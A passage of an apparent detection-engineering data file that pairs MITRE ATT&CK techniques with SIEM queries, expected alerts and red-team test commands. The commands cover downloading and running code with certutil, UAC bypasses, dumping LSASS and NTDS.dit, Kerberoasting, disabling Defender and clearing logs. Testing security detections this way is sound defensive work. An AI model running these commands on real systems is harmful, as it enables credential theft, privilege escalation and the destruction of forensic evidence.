      siemQueryExample: 'process.name:"cmd.exe" AND process.command_line:("whoami" OR "net user" OR "net group" OR "systeminfo")',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.003/T1059.003.md'
    }
  },
  {
    id: 'vt-t1204-002',
    name: 'User Execution - Malicious File',
    tactic: 'Execution',
    technique: 'T1204.002',
    techniqueName: 'User Execution: Malicious File',
    description: 'Test detection of user executing suspicious file',
    expectedLogSources: ['Sysmon', 'EDR', 'Antivirus'],
    testProcedure: 'Execute EICAR test file and verify process creation and AV alert',
    expectedFields: ['file_path', 'file_hash', 'user', 'verdict'],
    guidance: {
      whatToLookFor: [
        'Antivirus/EDR alert for malicious file execution',
        'Sysmon Event ID 1 showing execution from Downloads, Temp, or AppData',
        'File creation events (Sysmon ID 11) before execution',
        'Windows Defender Event ID 1116 (malware detected) or 1117 (blocked)',
        'Office applications spawning suspicious child processes'
      ],
      howToTest: [
        'EICAR: Create and execute EICAR test file (AV will likely prevent execution)',
        'Save EICAR to: C:\\Users\\testuser\\Downloads\\eicar.com',
        'For Office macro test: Create Word doc with AutoOpen macro calling cmd.exe',
        'Execute file from unusual location like C:\\ProgramData or C:\\Windows\\Temp',
        'Use certutil or PowerShell to download and execute: certutil -urlcache -f http://test/file.exe file.exe && file.exe'
      ],
      expectedAlerts: [
        'Malicious file execution blocked',
        'File executed from suspicious location (Temp, Downloads)',
        'Unsigned executable launched',
        'Office application spawned command shell',
        'Double extension detected (invoice.pdf.exe)'
      ],
      siemQueryExample: 'event.type:"process_create" AND (file.path:*\\\\Downloads\\\\* OR file.path:*\\\\Temp\\\\*) AND NOT process.code_signature.trusted:true',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.md'
    }
  },

  // Persistence
  {
    id: 'vt-t1053-005',
    name: 'Scheduled Task Creation',
    tactic: 'Persistence',
    technique: 'T1053.005',
    techniqueName: 'Scheduled Task/Job: Scheduled Task',
    description: 'Test detection of scheduled task creation',
    expectedLogSources: ['Windows Security', 'Sysmon', 'Task Scheduler'],
    testProcedure: 'Create scheduled task via schtasks.exe and verify event 4698',
    expectedFields: ['task_name', 'command', 'user', 'trigger'],
    guidance: {
      whatToLookFor: [
        'Windows Event ID 4698 (Scheduled Task Created) in Security log',
        'Sysmon Event ID 1 showing schtasks.exe with /create parameter',
        'Task Scheduler Event ID 106 (Task Registered) in TaskScheduler/Operational',
        'Task XML content showing command/action and triggers',
        'Tasks running as SYSTEM or with elevated privileges'
      ],
      howToTest: [
        'schtasks /create /tn "TestTask" /tr "cmd.exe /c whoami" /sc daily /st 09:00',
        'PowerShell: Register-ScheduledTask -TaskName "PSTest" -Action (New-ScheduledTaskAction -Execute "powershell.exe")',
        'Create task running as SYSTEM: schtasks /create /tn "SystemTask" /tr "calc.exe" /sc onstart /ru SYSTEM',
        'Create task from XML: schtasks /create /tn "XMLTask" /xml task.xml',
        'CLEANUP: schtasks /delete /tn "TestTask" /f'
      ],
      expectedAlerts: [
        'Scheduled task created by non-admin user',
        'Task executing suspicious binary (powershell, cmd, scripts)',
        'Task configured to run as SYSTEM',
        'Hidden or masked task name detected',
        'Task created via encoded command line'
      ],
      siemQueryExample: 'event.code:4698 OR (process.name:"schtasks.exe" AND process.command_line:"*/create*")',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md'
    }
  },
  {
    id: 'vt-t1547-001',
    name: 'Registry Run Keys',
    tactic: 'Persistence',
    technique: 'T1547.001',
    techniqueName: 'Boot or Logon Autostart Execution: Registry Run Keys',
    description: 'Test detection of registry autorun modifications',
    expectedLogSources: ['Sysmon', 'Windows Security', 'EDR'],
    testProcedure: 'Add value to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
    expectedFields: ['registry_key', 'registry_value', 'user', 'process'],
    guidance: {
      whatToLookFor: [
        'Sysmon Event ID 12 (Registry Object Added/Deleted) or ID 13 (Registry Value Set)',
        'Registry paths: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
        'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (requires admin)',
        'RunOnce, RunServices, Explorer\\Shell Folders variants',
        'Suspicious values pointing to temp folders, scripts, or encoded commands'
      ],
      howToTest: [
        'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v TestPersist /t REG_SZ /d "calc.exe" /f',
        'PowerShell: Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "PSPersist" -Value "powershell.exe"',
        'Test RunOnce: reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v TestOnce /d "notepad.exe"',
        'CLEANUP: reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v TestPersist /f'
      ],
      expectedAlerts: [
        'Autorun registry key modified',
        'Persistence mechanism created by non-admin process',
        'Registry Run key pointing to suspicious location',
        'PowerShell or script configured as autorun',
        'New Run key created by recently downloaded executable'
      ],
      siemQueryExample: 'event.code:(12 OR 13) AND registry.path:*\\\\CurrentVersion\\\\Run*',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md'
    }
  },
  {
    id: 'vt-t1136-001',
    name: 'Create Local Account',
    tactic: 'Persistence',
    technique: 'T1136.001',
    techniqueName: 'Create Account: Local Account',
    description: 'Test detection of new local account creation',
    expectedLogSources: ['Windows Security', 'Linux Auth'],
    testProcedure: 'Create new local user via net user command and verify event 4720',
    expectedFields: ['new_username', 'created_by', 'timestamp'],
    guidance: {
      whatToLookFor: [
        'Windows Event ID 4720 (User Account Was Created)',
        'Event ID 4722 (User Account Was Enabled) - often follows 4720',
        'Event ID 4732 (Member Added to Security-Enabled Local Group) - especially Administrators',
        'Linux: /var/log/auth.log showing "new user" or useradd entries',
        'Account attributes: never expires, password not required flags'
      ],
      howToTest: [
        'net user testpersist P@ssw0rd123 /add',
        'Add to administrators: net localgroup administrators testpersist /add',
        'PowerShell: New-LocalUser -Name "PSTestUser" -NoPassword',
        'Linux: sudo useradd -m testuser && sudo passwd testuser',
        'CLEANUP: net user testpersist /delete'
      ],
      expectedAlerts: [
        'Local account created outside of provisioning system',
        'Account added to privileged group (Administrators)',
        'Account created with suspicious name (mimicking service accounts)',
        'Account created by unexpected process (not MMC, SCCM)',
        'Hidden account created (username ending with $)'
      ],
      siemQueryExample: 'event.code:(4720 OR 4732) AND winlog.event_data.TargetUserName:* NOT source.user.name:("SCCM*" OR "provisioning")',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136.001/T1136.001.md'
    }
  },
  {
    id: 'vt-t1543-003',
    name: 'Windows Service Creation',
    tactic: 'Persistence',
    technique: 'T1543.003',
    techniqueName: 'Create or Modify System Process: Windows Service',
    description: 'Test detection of new service installation',
    expectedLogSources: ['Windows System', 'Sysmon', 'EDR'],
    testProcedure: 'Create new service via sc.exe and verify event 7045',
    expectedFields: ['service_name', 'service_path', 'user', 'start_type'],
    guidance: {
      whatToLookFor: [
        'Windows System Event ID 7045 (New Service Installed)',
        'Windows Security Event ID 4697 (Service Installed) if audit policy enabled',
        'Sysmon Event ID 1 showing sc.exe with create parameter',
        'Service binary path pointing to temp, downloads, or user-writable locations',
        'Services running as SYSTEM with suspicious binary paths'
      ],
      howToTest: [
        'sc create TestService binPath= "cmd.exe /c whoami" start= auto',
        'sc create PersistSvc binPath= "C:\\Windows\\Temp\\test.exe" type= own start= auto obj= LocalSystem',
        'PowerShell: New-Service -Name "PSTestSvc" -BinaryPathName "powershell.exe -c sleep 9999"',
        'CLEANUP: sc delete TestService'
      ],
      expectedAlerts: [
        'Service created with suspicious binary path',
        'Service running executable from user-writable location',
        'Service configured to run as SYSTEM',
        'Service created by unexpected user/process',
        'Service with command-line arguments in binary path (backdoor indicator)'
      ],
      siemQueryExample: 'event.code:7045 AND NOT winlog.event_data.ImagePath:("C:\\\\Program Files*" OR "C:\\\\Windows\\\\System32*")',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md'
    }
  },

  // Privilege Escalation
  {
    id: 'vt-t1548-002',
    name: 'UAC Bypass',
    tactic: 'Privilege Escalation',
    technique: 'T1548.002',
    techniqueName: 'Abuse Elevation Control Mechanism: Bypass UAC',
    description: 'Test detection of UAC bypass techniques',
    expectedLogSources: ['Sysmon', 'Windows Security', 'EDR'],
    testProcedure: 'Execute fodhelper UAC bypass and verify elevation event',
    expectedFields: ['process', 'integrity_level', 'parent_process'],
    guidance: {
      whatToLookFor: [
        'Sysmon Event ID 1 showing high integrity process spawned by medium integrity parent',
        'Registry modifications to auto-elevate program paths (fodhelper, eventvwr, etc.)',
        'Sysmon Event ID 13 for registry value changes in HKCU\\Software\\Classes',
        'Process spawn chain: explorer.exe -> fodhelper.exe -> cmd.exe (high integrity)',
        'Token manipulation events (Event ID 4703) if audit policies enabled'
      ],
      howToTest: [
        'Fodhelper bypass: reg add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /d "cmd.exe" /f && fodhelper.exe',
        'EventVwr bypass: reg add "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" /d "cmd.exe" /f && eventvwr.exe',
        'Use UACME project for comprehensive testing: https://github.com/hfiref0x/UACME',
        'Verify elevated shell with: whoami /priv (should show elevated privileges)',
        'CLEANUP: reg delete "HKCU\\Software\\Classes\\ms-settings" /f'
      ],
      expectedAlerts: [
        'UAC bypass attempt detected',
        'High integrity process spawned without UAC prompt',
        'Suspicious registry modification to auto-elevate paths',
        'Known UAC bypass technique pattern detected',
        'Process elevation without consent UI interaction'
      ],
      siemQueryExample: 'event.code:1 AND process.parent.name:("fodhelper.exe" OR "eventvwr.exe" OR "computerdefaults.exe") AND process.name:"cmd.exe"',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md'
    }
  },
  {
    id: 'vt-t1068',
    name: 'Exploitation for Privilege Escalation',
    tactic: 'Privilege Escalation',
    technique: 'T1068',
    techniqueName: 'Exploitation for Privilege Escalation',
    description: 'Test detection of privilege escalation exploitation',
    expectedLogSources: ['EDR', 'Sysmon', 'Windows Security'],
    testProcedure: 'Execute known priv-esc test (e.g., PrintNightmare simulation)',
    expectedFields: ['process', 'user', 'target_privilege', 'exploit_indicator'],
    guidance: {
      whatToLookFor: [
        'EDR alerts for known CVE exploitation patterns',
        'Unusual SYSTEM-level process creation from user process',
        'Driver loading events (Sysmon Event ID 6) for vulnerable drivers',
        'Token manipulation and impersonation activities',
        'Spoolsv.exe spawning child processes (PrintNightmare indicator)'
      ],
      howToTest: [
        'SAFE: Use vulnerability scanners to identify unpatched priv-esc vulns',
        'SAFE: Run Seatbelt or winPEAS for priv-esc enumeration (generates detectable activity)',
        'SAFE: Test named pipe impersonation detection with SafePotato simulation',
        'Review CVE databases for recent priv-esc vulnerabilities affecting your OS version',
        'NOTE: Actual exploitation testing should only be done in isolated lab environments'
      ],
      expectedAlerts: [
        'Known vulnerability exploitation attempt',
        'Suspicious driver loaded',
        'Token manipulation detected',
        'SYSTEM process spawned from user context',
        'Print spooler exploitation indicators'
      ],
      siemQueryExample: 'event.category:"intrusion_detection" AND event.type:"exploit" AND user.target.name:"SYSTEM"',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1068/T1068.md'
    }
  },

  // Defense Evasion
  {
    id: 'vt-t1070-001',
    name: 'Clear Windows Event Logs',
    tactic: 'Defense Evasion',
    technique: 'T1070.001',
    techniqueName: 'Indicator Removal: Clear Windows Event Logs',
    description: 'Test detection of event log clearing',
    expectedLogSources: ['Windows Security', 'Windows System', 'Sysmon'],
    testProcedure: 'Clear Security event log and verify event 1102 is generated',
    expectedFields: ['log_name', 'user', 'timestamp'],
    guidance: {
      whatToLookFor: [
        'Windows Security Event ID 1102 (Audit Log Cleared) - the last event before log wipe',
        'Windows System Event ID 104 (System Log Cleared)',
        'Sysmon Event ID 1 showing wevtutil.exe or PowerShell Clear-EventLog',
        'Process command lines containing "wevtutil cl" or "Clear-EventLog"',
        'Multiple log clear events in quick succession'
      ],
      howToTest: [
        'wevtutil cl Application (clears Application log)',
        'PowerShell: Clear-EventLog -LogName Application',
        'Clear multiple: for /f %x in (\'wevtutil el\') do wevtutil cl "%x"',
        'Test with test log first: wevtutil cl "Test Log Name"',
        'IMPORTANT: Use a test system - this destroys forensic evidence'
      ],
      expectedAlerts: [
        'Event log cleared by non-admin user',
        'Security audit log cleared',
        'Multiple logs cleared in sequence',
        'Log clearing during active security incident',
        'Event log cleared outside maintenance window'
      ],
      siemQueryExample: 'event.code:(1102 OR 104) OR (process.name:"wevtutil.exe" AND process.command_line:"*cl*")',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.001/T1070.001.md'
    }
  },
  {
    id: 'vt-t1562-001',
    name: 'Disable Windows Defender',
    tactic: 'Defense Evasion',
    technique: 'T1562.001',
    techniqueName: 'Impair Defenses: Disable or Modify Tools',
    description: 'Test detection of security tool tampering',
    expectedLogSources: ['Windows Defender', 'Sysmon', 'EDR'],
    testProcedure: 'Attempt to disable Defender and verify tamper alert',
    expectedFields: ['tool_name', 'action', 'user', 'process'],
    guidance: {
      whatToLookFor: [
        'Windows Defender Event ID 5001 (Real-time Protection Disabled)',
        'Windows Defender Event ID 5010 (Scanning for malware disabled)',
        'Windows Defender Event ID 5007 (Configuration Changed)',
        'Sysmon registry events for Defender DisableAntiSpyware or similar',
        'PowerShell Set-MpPreference commands to disable features',
        'Tamper Protection alerts (if enabled)'
      ],
      howToTest: [
        'PowerShell (requires admin): Set-MpPreference -DisableRealtimeMonitoring $true',
        'Registry (requires admin): reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
        'Stop service (will fail with Tamper Protection): sc stop WinDefend',
        'NOTE: Modern Windows with Tamper Protection enabled will block these attempts',
        'Use Defender exclusions as alternative test: Add-MpPreference -ExclusionPath "C:\\Temp"'
      ],
      expectedAlerts: [
        'Real-time protection disabled',
        'Security tool tampering attempted',
        'Defender exclusion added for suspicious path',
        'Security service stopped or modified',
        'Tamper protection triggered'
      ],
      siemQueryExample: 'source:"Microsoft-Windows-Windows Defender" AND event.code:(5001 OR 5007 OR 5010)',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md'
    }
  },
  {
    id: 'vt-t1027',
    name: 'Obfuscated PowerShell',
    tactic: 'Defense Evasion',
    technique: 'T1027',
    techniqueName: 'Obfuscated Files or Information',
    description: 'Test detection of obfuscated script execution',
    expectedLogSources: ['PowerShell', 'Sysmon', 'EDR'],
    testProcedure: 'Execute base64 encoded PowerShell and verify decoded logging',
    expectedFields: ['encoded_command', 'decoded_content', 'user'],
    guidance: {
      whatToLookFor: [
        'Windows Event ID 4104 (Script Block Logging) shows DEOBFUSCATED code',
        'PowerShell command lines with -enc, -e, -encoded parameters',
        'Unusual character patterns: backticks, carets, string concatenation',
        'Variable substitution patterns: $env:comspec[4,15,25]-join""',
        'Invoke-Obfuscation patterns: character codes, string reversal'
      ],
      howToTest: [
        'Basic encoding: powershell -enc dwByAGkAdABlAC0AaABvAHMAdAAgACIAaABlAGwAbABvACIA',
        'String concat: $a="Wri";$b="te-Ho";$c="st";iex "$a$b$c \'test\'"',
        'Char codes: [char]87+[char]104+[char]111+[char]97+[char]109+[char]105 | iex',
        'Use Invoke-Obfuscation to generate test samples: https://github.com/danielbohannon/Invoke-Obfuscation',
        'Verify Script Block Logging is enabled to see deobfuscated output'
      ],
      expectedAlerts: [
        'Encoded PowerShell command detected',
        'Obfuscated script execution',
        'String obfuscation techniques in command line',
        'AMSI detected obfuscated content',
        'Suspicious character entropy in script'
      ],
      siemQueryExample: 'process.name:"powershell.exe" AND process.command_line:("-enc" OR "-e " OR "FromBase64String" OR "[char]")',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027/T1027.md'
    }
  },

  // Credential Access
  {
    id: 'vt-t1003-001',
    name: 'LSASS Memory Dump',
    tactic: 'Credential Access',
    technique: 'T1003.001',
    techniqueName: 'OS Credential Dumping: LSASS Memory',
    description: 'Test detection of LSASS memory access',
    expectedLogSources: ['Sysmon', 'Windows Security', 'EDR'],
    testProcedure: 'Access LSASS process memory (e.g., procdump, mimikatz simulation)',
    expectedFields: ['target_process', 'source_process', 'access_rights', 'user'],
    guidance: {
      whatToLookFor: [
        'Sysmon Event ID 10 (Process Access) targeting lsass.exe',
        'Access mask 0x1010 or 0x1FFFFF (PROCESS_ALL_ACCESS) on LSASS',
        'Windows Security Event ID 4656/4663 for handle to lsass.exe',
        'Sysmon Event ID 1 showing procdump.exe, comsvcs.dll, or mimikatz-like tools',
        'Unusual processes accessing lsass.exe (not csrss, svchost)'
      ],
      howToTest: [
        'Procdump (Sysinternals): procdump.exe -ma lsass.exe lsass.dmp',
        'Comsvcs.dll method: rundll32.exe C:\\windows\\System32\\comsvcs.dll MiniDump <lsass_pid> lsass.dmp full',
        'Task Manager: Right-click lsass.exe -> Create dump file (generates detectable activity)',
        'PowerShell: Get-Process lsass | Out-Minidump (using Out-Minidump module)',
        'IMPORTANT: LSASS is protected - tests may trigger Credential Guard or PPL'
      ],
      expectedAlerts: [
        'LSASS memory access detected',
        'Credential dumping tool execution',
        'Suspicious process accessing LSASS',
        'Memory dump file created from LSASS',
        'Credential Guard violation attempt'
      ],
      siemQueryExample: 'event.code:10 AND winlog.event_data.TargetImage:"*lsass.exe" AND NOT winlog.event_data.SourceImage:("*csrss.exe" OR "*svchost.exe")',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md'
    }
  },
  {
    id: 'vt-t1003-003',
    name: 'NTDS.dit Access',
    tactic: 'Credential Access',
    technique: 'T1003.003',
    techniqueName: 'OS Credential Dumping: NTDS',
    description: 'Test detection of AD database access',
    expectedLogSources: ['Windows Security', 'Sysmon', 'EDR'],
    testProcedure: 'Attempt to copy NTDS.dit via VSS and verify detection',
    expectedFields: ['file_path', 'user', 'process'],
    guidance: {
      whatToLookFor: [
        'Sysmon Event ID 1 showing vssadmin.exe, ntdsutil.exe, or diskshadow.exe',
        'File access events for C:\\Windows\\NTDS\\ntds.dit',
        'Volume Shadow Copy creation events',
        'Sysmon Event ID 11 (File Create) for copied NTDS.dit or SYSTEM hive',
        'DCSync indicators: Directory Replication Service requests'
      ],
      howToTest: [
        'VSS method: vssadmin create shadow /for=C: && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit c:\\temp\\',
        'Ntdsutil: ntdsutil "ac i ntds" "ifm" "create full c:\\temp" q q',
        'Diskshadow script method (create diskshadow script with VSS commands)',
        'NOTE: These commands require Domain Controller access - use isolated lab DC',
        'CLEANUP: vssadmin delete shadows /all /quiet'
      ],
      expectedAlerts: [
        'NTDS.dit access or copy attempt',
        'Volume Shadow Copy created on Domain Controller',
        'AD database exfiltration attempt',
        'DCSync attack detected (replication requests)',
        'Ntdsutil or diskshadow suspicious usage'
      ],
      siemQueryExample: 'host.role:"domain_controller" AND (file.path:"*ntds.dit*" OR process.name:("ntdsutil.exe" OR "diskshadow.exe"))',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md'
    }
  },
  {
    id: 'vt-t1558-003',
    name: 'Kerberoasting',
    tactic: 'Credential Access',
    technique: 'T1558.003',
    techniqueName: 'Steal or Forge Kerberos Tickets: Kerberoasting',
    description: 'Test detection of Kerberos ticket requests for SPNs',
    expectedLogSources: ['Windows Security', 'Domain Controller'],
    testProcedure: 'Request TGS tickets for service accounts and verify event 4769',
    expectedFields: ['service_name', 'encryption_type', 'user', 'client_ip'],
    guidance: {
      whatToLookFor: [
        'Windows Event ID 4769 (Kerberos Service Ticket Request) on Domain Controller',
        'Encryption Type 0x17 (RC4-HMAC) - weak encryption targeted by attackers',
        'Multiple TGS requests for different SPNs from single user in short time',
        'Requests for service accounts with SPNs (SQL, Exchange, etc.)',
        'Event ID 4768 (TGT Request) followed by many 4769 events'
      ],
      howToTest: [
        'PowerShell: Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName',
        'Request ticket: Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/server:1433"',
        'Rubeus: Rubeus.exe kerberoast /outfile:hashes.txt',
        'GetUserSPNs.py (Impacket): GetUserSPNs.py -request domain/user:password',
        'Verify RC4 encryption requests in DC Security logs'
      ],
      expectedAlerts: [
        'Kerberoasting attack detected - multiple SPN requests',
        'RC4 encryption Kerberos ticket requested',
        'Unusual volume of service ticket requests',
        'Known Kerberoasting tool execution',
        'Service ticket requested for sensitive SPN'
      ],
      siemQueryExample: 'event.code:4769 AND winlog.event_data.TicketEncryptionType:"0x17" AND winlog.event_data.ServiceName:*$ | stats count by user.name | where count > 5',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.003/T1558.003.md'
    }
  },

  // Discovery
  {
    id: 'vt-t1087-001',
    name: 'Local Account Discovery',
    tactic: 'Discovery',
    technique: 'T1087.001',
    techniqueName: 'Account Discovery: Local Account',
    description: 'Test detection of local account enumeration',
    expectedLogSources: ['Sysmon', 'Windows Security', 'EDR'],
    testProcedure: 'Run net user command and verify process logging',
    expectedFields: ['command_line', 'user', 'process'],
    guidance: {
      whatToLookFor: [
        'Sysmon Event ID 1 showing net.exe, net1.exe, or wmic.exe with user enumeration',
        'Command lines containing "net user", "net localgroup", "wmic useraccount"',
        'PowerShell commands: Get-LocalUser, Get-LocalGroupMember',
        'Multiple discovery commands executed in sequence (recon pattern)',
        'Process execution from unusual parent (Word, PowerShell, WScript)'
      ],
      howToTest: [
        'net user (list local users)',
        'net localgroup administrators (list admin group members)',
        'wmic useraccount list brief (WMI user enumeration)',
        'PowerShell: Get-LocalUser | Select Name, Enabled, LastLogon',
        'PowerShell: Get-LocalGroupMember -Group "Administrators"'
      ],
      expectedAlerts: [
        'Local account enumeration detected',
        'Reconnaissance activity pattern',
        'Built-in admin tools used for enumeration',
        'Rapid sequence of discovery commands',
        'Account enumeration from non-admin user'
      ],
      siemQueryExample: 'process.name:("net.exe" OR "net1.exe") AND process.command_line:("user" OR "localgroup") NOT process.command_line:"*add*"',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.001/T1087.001.md'
    }
  },
  {
    id: 'vt-t1087-002',
    name: 'Domain Account Discovery',
    tactic: 'Discovery',
    technique: 'T1087.002',
    techniqueName: 'Account Discovery: Domain Account',
    description: 'Test detection of AD user enumeration',
    expectedLogSources: ['Domain Controller', 'Windows Security', 'Sysmon'],
    testProcedure: 'Run net user /domain and verify LDAP query logging',
    expectedFields: ['command_line', 'user', 'ldap_query'],
    guidance: {
      whatToLookFor: [
        'Sysmon Event ID 1 with net.exe containing "/domain" parameter',
        'LDAP queries visible in DC Security logs (Event ID 4662)',
        'BloodHound/SharpHound collection activity (mass LDAP queries)',
        'PowerShell AD module commands: Get-ADUser, Get-ADGroup',
        'Unusual volume of directory service queries from single workstation'
      ],
      howToTest: [
        'net user /domain (list domain users)',
        'net group "Domain Admins" /domain (list DA members)',
        'nltest /dclist:DOMAIN (enumerate domain controllers)',
        'PowerShell: Get-ADUser -Filter * -Properties * (requires RSAT)',
        'dsquery user -limit 0 (enumerate all users via dsquery)'
      ],
      expectedAlerts: [
        'Domain account enumeration detected',
        'High volume LDAP queries from workstation',
        'BloodHound/SharpHound collection detected',
        'Domain reconnaissance activity',
        'Sensitive group membership query (Domain Admins, Enterprise Admins)'
      ],
      siemQueryExample: 'process.name:("net.exe" OR "dsquery.exe" OR "nltest.exe") AND process.command_line:"*/domain*"',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.002/T1087.002.md'
    }
  },
  {
    id: 'vt-t1046',
    name: 'Network Service Discovery',
    tactic: 'Discovery',
    technique: 'T1046',
    techniqueName: 'Network Service Discovery',
    description: 'Test detection of port scanning activity',
    expectedLogSources: ['Firewall', 'IDS/IPS', 'EDR', 'Zeek'],
    testProcedure: 'Run nmap scan against test targets and verify detection',
    expectedFields: ['source_ip', 'dest_ip', 'ports', 'scan_type'],
    guidance: {
      whatToLookFor: [
        'Firewall logs showing rapid connection attempts to multiple ports',
        'IDS/IPS alerts for port scan signatures',
        'Zeek conn.log showing many rejected/reset connections',
        'Single source connecting to multiple destinations on same port',
        'EDR alerting on scanning tool execution (nmap, masscan, etc.)'
      ],
      howToTest: [
        'nmap -sS -p 22,80,443,445,3389 192.168.1.0/24 (SYN scan)',
        'nmap -sV -p 1-1000 target (Version detection)',
        'PowerShell: 1..1024 | % { Test-NetConnection -ComputerName target -Port $_ -WarningAction SilentlyContinue }',
        'Test-NetConnection -ComputerName target -Port 445 (single port check)',
        'IMPORTANT: Only scan systems you own/have permission to scan'
      ],
      expectedAlerts: [
        'Port scan detected from internal host',
        'Network reconnaissance activity',
        'Horizontal scan (single port, many hosts)',
        'Vertical scan (single host, many ports)',
        'Scanning tool execution detected'
      ],
      siemQueryExample: 'event.category:"network" AND event.type:"connection" | stats dc(destination.port) as port_count by source.ip | where port_count > 20',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md'
    }
  },

  // Lateral Movement
  {
    id: 'vt-t1021-001',
    name: 'Remote Desktop Protocol',
    tactic: 'Lateral Movement',
    technique: 'T1021.001',
    techniqueName: 'Remote Services: Remote Desktop Protocol',
    description: 'Test detection of RDP lateral movement',
    expectedLogSources: ['Windows Security', 'Windows TerminalServices', 'Firewall'],
    testProcedure: 'RDP to test system and verify logon event 4624 type 10',
    expectedFields: ['source_ip', 'dest_host', 'user', 'logon_type'],
    guidance: {
      whatToLookFor: [
        'Windows Event ID 4624 with Logon Type 10 (RemoteInteractive)',
        'Windows TerminalServices-RemoteConnectionManager Event ID 1149 (User authentication)',
        'Windows TerminalServices-LocalSessionManager Event ID 21 (Session logon)',
        'Firewall logs showing TCP 3389 connections',
        'Unusual RDP source IPs (internal lateral movement)'
      ],
      howToTest: [
        'mstsc /v:target-host (standard RDP connection)',
        'cmdkey /generic:target /user:DOMAIN\\user /pass:password && mstsc /v:target',
        'PowerShell: Enter-PSSession for alternative remote access',
        'Test from unexpected source: RDP from server to workstation (reverse direction)',
        'Record timestamp and verify all RDP event IDs are captured'
      ],
      expectedAlerts: [
        'RDP connection from unusual source IP',
        'RDP connection to sensitive server',
        'After-hours RDP access',
        'RDP brute force (multiple failed RDP logins)',
        'First-time RDP access to system (UEBA)'
      ],
      siemQueryExample: 'event.code:4624 AND winlog.event_data.LogonType:"10" AND source.ip:* | stats count by source.ip, destination.hostname, user.name',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.001/T1021.001.md'
    }
  },
  {
    id: 'vt-t1021-002',
    name: 'SMB/Windows Admin Shares',
    tactic: 'Lateral Movement',
    technique: 'T1021.002',
    techniqueName: 'Remote Services: SMB/Windows Admin Shares',
    description: 'Test detection of admin share access',
    expectedLogSources: ['Windows Security', 'Sysmon', 'Firewall'],
    testProcedure: 'Access C$ or ADMIN$ share and verify event 5140/5145',
    expectedFields: ['source_ip', 'share_name', 'user', 'access_type'],
    guidance: {
      whatToLookFor: [
        'Windows Event ID 5140 (Network Share Accessed)',
        'Windows Event ID 5145 (Detailed File Share Access) - object-level auditing',
        'Sysmon Event ID 3 (Network Connection) to port 445',
        'Share names: C$, ADMIN$, IPC$, or custom admin shares',
        'Multiple hosts accessing same admin shares in short timeframe'
      ],
      howToTest: [
        'net use Z: \\\\target\\C$ /user:DOMAIN\\admin password',
        'dir \\\\target\\C$\\Windows\\System32 (enumerate system files)',
        'copy malware.exe \\\\target\\C$\\Windows\\Temp\\ (file staging)',
        'net use * /delete (cleanup mapped drives)',
        'Test access to multiple systems to trigger lateral movement alert'
      ],
      expectedAlerts: [
        'Admin share accessed from workstation',
        'Multiple admin share connections in short time (lateral movement)',
        'File copied to admin share',
        'Admin share access from non-admin workstation',
        'First-time admin share access to system'
      ],
      siemQueryExample: 'event.code:(5140 OR 5145) AND winlog.event_data.ShareName:("*C$*" OR "*ADMIN$*") | stats count by source.ip, winlog.event_data.ShareName',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.002/T1021.002.md'
    }
  },
  {
    id: 'vt-t1047',
    name: 'WMI Remote Execution',
    tactic: 'Lateral Movement',
    technique: 'T1047',
    techniqueName: 'Windows Management Instrumentation',
    description: 'Test detection of WMI-based remote execution',
    expectedLogSources: ['Windows Security', 'Sysmon', 'WMI Logs'],
    testProcedure: 'Execute command via wmic /node and verify WMI logging',
    expectedFields: ['source_host', 'dest_host', 'command', 'user'],
    guidance: {
      whatToLookFor: [
        'Sysmon Event ID 1 showing wmiprvse.exe spawning suspicious child process',
        'Sysmon Event ID 1 showing wmic.exe with /node parameter',
        'WMI-Activity/Operational Event ID 5857-5861 (WMI query events)',
        'Windows Security Event ID 4624 Type 3 followed by WMI activity',
        'Network connections to WMI ports (135, dynamic RPC)'
      ],
      howToTest: [
        'wmic /node:target process call create "cmd.exe /c whoami > c:\\temp\\out.txt"',
        'wmic /node:target process list brief (remote process listing)',
